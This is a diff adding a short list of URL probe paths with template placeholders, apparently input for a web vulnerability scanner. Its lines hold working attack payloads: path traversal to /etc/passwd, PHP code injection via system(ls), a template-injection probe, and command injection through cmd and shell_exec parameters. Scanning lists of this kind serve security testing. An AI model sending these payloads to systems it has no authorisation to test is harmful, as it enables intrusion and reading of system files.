@@ -1,0 +1,12 @@
+/..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
+/infusions/downloads/downloads.php?cat_id=${system(ls)}
+{{paths}}
+
+/_debugbar/open
+/login.php/
+/search?search_key=%7B%7B1337*1338%7D%7D
+/arcade.php?act=Arcade&do=stats&comment=a&s_id=1
+/faq.php?cmd=echo%20-n%20{{num}}|md5sum
+/forum.php?x=shell_exec&y=echo%20-n%20{{num}}|md5sum
+/{{paths}}/faq.php?cmd=echo%20-n%20{{num}}|md5sum
+/{{paths}}/forum.php?x=shell_exec&y=echo%20-n%20{{num}}|md5sum
